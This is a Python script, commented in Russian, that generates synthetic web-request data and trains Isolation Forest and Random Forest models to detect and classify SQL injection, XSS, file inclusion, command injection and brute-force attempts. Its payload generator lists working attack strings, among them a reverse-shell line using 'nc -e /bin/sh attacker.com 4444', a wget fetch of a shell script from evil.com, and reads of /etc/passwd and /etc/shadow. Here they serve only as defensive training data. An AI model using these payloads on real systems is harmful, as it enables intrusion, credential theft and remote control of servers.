#!/usr/bin/env python3
import pandas as pd
import numpy as np
import math
import re
import random
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.metrics import classification_report, accuracy_score
import joblib
import os

# Устанавливаем seed для воспроизводимости
np.random.seed(42)
random.seed(42)

def generate_attack_payload(attack_type):
    """Генерирует реалистичный payload для заданного типа атаки"""
    if attack_type == 'sqli':
        return random.choice([
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT username,password FROM users--",
            "1' AND '1'='1",
            "admin'--",
            "' OR 1=1--",
            "'; exec xp_cmdshell('dir')--",
            "' WAITFOR DELAY '0:0:5'--"
        ])
    elif attack_type == 'xss':
        return random.choice([
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "';alert(1)//",
            "<ScRiPt>alert(1)</ScRiPt>"
        ])
    elif attack_type == 'lfi':
        return random.choice([
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/shadow",
            "....//....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "file:///etc/passwd"
        ])
    elif attack_type == 'rce':
        return random.choice([
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(id)",
            "& ping -c 10 127.0.0.1 &",
            "|| wget http://evil.com/shell.sh",
            "'; nc -e /bin/sh attacker.com 4444"
        ])
    elif attack_type == 'brute':
        return random.choice([
            "password=123456",
            "admin=admin",
            "user=root&pass=toor",
            "login=admin&password=admin",
            "username=administrator&password=password"
        ])
    else:  # normal
        return random.choice([
            "product=1",
            "search=apple",
            "email=user@example.com",
            "page=2",
            "category=electronics",
            "sort=price",
            "q=test",
            "id=100"
        ])

def compute_features(payload, attack_type, endpoint=''):
    """Вычисляет все признаки для заданного payload"""
    # Базовые
    request_length = len(endpoint) + len(payload)
    param_count = payload.count('&') + (1 if '?' in payload else 0) + 1  # минимум 1 параметр
    special_chars = sum(1 for c in payload if c in "'\"<>();%&|`$")
    special_char_ratio = special_chars / (len(payload) + 1)
    url_depth = endpoint.count('/') if endpoint else 3
    user_agent_length = 120  # фиксированное среднее значение
    content_length = len(payload)
    request_time_seconds = random.uniform(0.1, 2.0)

    # HTTP статус
    if attack_type == 'normal':
        status_code = 200
    else:
        status_code = random.choice([400, 404, 500])

    # SQL ключевые слова
    sql_keywords = ['select', 'union', 'insert', 'delete', 'update', 'drop', 'alter', 'create', 'where', 'from', 'order by', 'group by', 'having', 'join', 'on', 'and', 'or', 'not', 'null', '--', '#', '/*']
    sql_keywords_count = 0
    payload_lower = payload.lower()
    for kw in sql_keywords:
        sql_keywords_count += payload_lower.count(kw)

    # HTML теги
    html_tags = re.findall(r'<[^>]+>', payload)
    html_tag_count = len(html_tags)

    # Path traversal
    path_traversal_count = payload.count('../') + payload.count('..\\') + payload.count('..%2f')

    # Энтропия
    if payload:
        prob = [float(payload.count(c)) / len(payload) for c in set(payload)]
        entropy = -sum([p * math.log2(p) for p in prob])
    else:
        entropy = 0

    # Длина самого длинного слова
    tokens = re.split(r'[^a-zA-Z0-9]', payload)
    max_token_length = max((len(t) for t in tokens), default=0)

    # Наличие '='
    has_equals = 1 if '=' in payload else 0

    # Наличие кавычек
    has_quotes = 1 if ("'" in payload or '"' in payload) else 0

    # Цифры и буквы
    digit_count = sum(c.isdigit() for c in payload)
    letter_count = sum(c.isalpha() for c in payload)
    letter_digit_ratio = letter_count / (digit_count + 1)

    return {
        'request_length': request_length,
        'param_count': param_count,
        'special_char_ratio': round(special_char_ratio, 4),
        'url_depth': url_depth,
        'user_agent_length': user_agent_length,
        'content_length': content_length,
        'request_time_seconds': round(request_time_seconds, 2),
        'status_code': status_code,
        'sql_keywords_count': sql_keywords_count,
        'html_tag_count': html_tag_count,
        'path_traversal_count': path_traversal_count,
        'entropy': round(entropy, 4),
        'max_token_length': max_token_length,
        'has_equals': has_equals,
        'has_quotes': has_quotes,
        'digit_count': digit_count,
        'letter_count': letter_count,
        'letter_digit_ratio': round(letter_digit_ratio, 4)
    }

def generate_dataset(n_normal=2000, n_attacks_per_type=500):
    """Генерирует сбалансированный датасет с нормальными запросами и атаками"""
    attack_types = ['sqli', 'xss', 'lfi', 'rce', 'brute']
    data = []

    # Нормальные запросы
    for _ in range(n_normal):
        payload = generate_attack_payload('normal')
        features = compute_features(payload, 'normal', endpoint='/api/products')
        features['attack_type'] = 'normal'
        data.append(features)

    # Атаки каждого типа
    for atype in attack_types:
        for _ in range(n_attacks_per_type):
            payload = generate_attack_payload(atype)
            # Для разных типов атак используем разные типичные эндпоинты
            if atype == 'sqli':
                endpoint = '/rest/user/login'
            elif atype == 'xss':
                endpoint = '/#/search'
            elif atype == 'lfi':
                endpoint = '/ftp'
            elif atype == 'rce':
                endpoint = '/rest/admin/application-configuration'
            else:
                endpoint = '/rest/user/login'
            features = compute_features(payload, atype, endpoint=endpoint)
            features['attack_type'] = atype
            data.append(features)

    df = pd.DataFrame(data)
    return df

def main():
    print("=" * 60)
    print("ТРЕНИРОВКА ML МОДЕЛЕЙ (УЛУЧШЕННЫЕ ПРИЗНАКИ)")
    print("=" * 60)

    # Создаём папки
    os.makedirs('models', exist_ok=True)
    os.makedirs('training_data', exist_ok=True)

    # Генерируем данные
    print("\nГенерация расширенного датасета...")
    df = generate_dataset(n_normal=3000, n_attacks_per_type=600)  # всего ~6000 записей
    print(f"✅ Сгенерировано {len(df)} записей")

    # Сохраняем для истории
    df.to_csv('training_data/web_traffic_dataset_enhanced.csv', index=False)
    print("✅ Датасет сохранён в training_data/web_traffic_dataset_enhanced.csv")

    # Признаки (все, кроме 'attack_type')
    feature_cols = [col for col in df.columns if col != 'attack_type']
    X = df[feature_cols]
    y = df['attack_type']

    # Масштабирование
    scaler = StandardScaler()
    X_scaled = scaler.fit_transform(X)
    joblib.dump(scaler, 'models/scaler.joblib')
    print("✅ Scaler сохранён")

    # Разделение на train/test
    X_train, X_test, y_train, y_test = train_test_split(
        X_scaled, y, test_size=0.2, random_state=42, stratify=y
    )

    # ---- Isolation Forest (обнаружение аномалий) ----
    print("\nОбучение Isolation Forest...")
    iso_labels = (y_train != 'normal').astype(int)  # 1 = аномалия, 0 = норма
    iso_forest = IsolationForest(
        n_estimators=150,
        contamination=0.15,  # примерно 15% аномалий в наших данных
        random_state=42,
        n_jobs=-1,
        bootstrap=True
    )
    iso_forest.fit(X_train)
    joblib.dump(iso_forest, 'models/isolation_forest_real.joblib')
    print("✅ Isolation Forest сохранён")

    # Оценка Isolation Forest на тесте
    iso_pred = iso_forest.predict(X_test)
    iso_anomalies = (iso_pred == -1).sum()
    print(f"   Обнаружено аномалий в тесте: {iso_anomalies} из {len(X_test)}")

    # ---- Random Forest (классификация типов атак) ----
    # Обучаем только на атаках (исключаем normal для классификации)
    attack_mask_train = y_train != 'normal'
    attack_mask_test = y_test != 'normal'

    if attack_mask_train.any() and attack_mask_test.any():
        X_train_attack = X_train[attack_mask_train]
        y_train_attack = y_train[attack_mask_train]
        X_test_attack = X_test[attack_mask_test]
        y_test_attack = y_test[attack_mask_test]

        # Кодируем метки
        le = LabelEncoder()
        y_train_encoded = le.fit_transform(y_train_attack)
        y_test_encoded = le.transform(y_test_attack)

        # Обучаем Random Forest
        print("\nОбучение Random Forest...")
        rf = RandomForestClassifier(
            n_estimators=200,
            max_depth=15,
            min_samples_split=5,
            random_state=42,
            n_jobs=-1,
            class_weight='balanced'
        )
        rf.fit(X_train_attack, y_train_encoded)

        # Сохраняем модель и encoder
        joblib.dump(rf, 'models/random_forest_real.joblib')
        joblib.dump(le, 'models/label_encoder.joblib')
        print("✅ Random Forest и Label Encoder сохранены")

        # Оценка
        y_pred_encoded = rf.predict(X_test_attack)
        accuracy = accuracy_score(y_test_encoded, y_pred_encoded)
        print(f"   Точность Random Forest: {accuracy:.3f}")

        y_pred_labels = le.inverse_transform(y_pred_encoded)
        print("\n   Отчёт классификации (только атаки):")
        print(classification_report(y_test_attack, y_pred_labels))

    # Важность признаков
    if 'rf' in locals():
        importance = pd.DataFrame({
            'feature': feature_cols,
            'importance': rf.feature_importances_
        }).sort_values('importance', ascending=False)
        print("\n   Топ-10 важных признаков (Random Forest):")
        print(importance.head(10).to_string(index=False))

    print("\n" + "=" * 60)
    print("ОБУЧЕНИЕ ЗАВЕРШЕНО. МОДЕЛИ СОХРАНЕНЫ В ПАПКУ models/")
    print("=" * 60)

if __name__ == "__main__":
     main()
